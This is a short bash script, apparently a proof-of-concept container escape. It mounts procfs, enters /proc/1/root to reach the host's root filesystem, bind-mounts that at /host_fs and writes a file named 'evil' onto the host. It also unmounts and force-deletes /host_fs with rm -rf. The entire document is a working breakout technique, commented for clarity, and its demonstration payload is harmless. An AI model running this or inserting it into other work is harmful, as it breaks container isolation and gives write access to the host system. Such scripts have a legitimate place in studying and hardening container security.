#!/bin/bash
exec > /break_logs 2>&1  # defer output & err to break_logs

umount /host_fs && rm -rf /host_fs
mkdir /host_fs

mount -t proc none /proc  # mount host's procfs
cd /proc/1/root           # chdirs to host's root
mount --bind . /host_fs   # mount host root at /host_fs

echo "Hello from within the container!" > /host_fs/evil